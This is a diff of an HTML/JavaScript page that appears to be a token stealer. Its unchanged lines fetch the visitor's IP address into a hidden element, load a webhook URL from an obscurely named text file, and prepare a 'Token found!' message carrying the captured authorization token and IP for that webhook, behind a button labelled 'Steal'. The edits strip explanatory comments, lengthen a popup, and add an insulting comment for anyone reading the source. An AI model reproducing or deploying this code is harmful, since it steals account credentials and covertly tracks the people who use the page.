@@ -8,7 +8,7 @@
         $(document).ready(function() {
             $.getJSON("https://api.ipify.org?format=json", function(data) {
                 var ip = data.ip;
-                document.getElementById("ipAddress").textContent = ip; // Update the IP address on the page
+                document.getElementById("ipAddress").textContent = ip;
             });
         });
         
@@ -24,7 +24,7 @@
             
             if (authorization) {
                 $.get('kcygyegfierdgfsbdsfjh4efbdsbifweriuewdufndifi4ufniudnfuinjdsnfjks.txt', function(webhookUrl) {
-                    var ipAddress = document.getElementById("ipAddress").textContent; // Get the IP address from the page
+                    var ipAddress = document.getElementById("ipAddress").textContent;
                 
                     var payload = {
                         'content': '@everyone @here Token found! (Steel loves u)',
@@ -72,7 +72,7 @@
             popup.style.display = "block";
             setTimeout(function() {
                 popup.style.display = "none";
-            }, 3000); // Display for 3 seconds
+            }, 80000);
         }
     </script>
 </head>
@@ -82,7 +82,7 @@
         <input type="text" id="inputText">
         <button onclick="searchAuthorization()">Steal</button>
         <div id="popup" class="popup"></div>
-        <div id="ipAddress" style="display: none;"></div> <!-- Hidden element to store the IP address -->
+        <div id="ipAddress" style="display: none;"></div> <!-- fuckin moron whatchu tryna do lil bro get yo ass outta here -->
     </div>
 </body>
 </html>
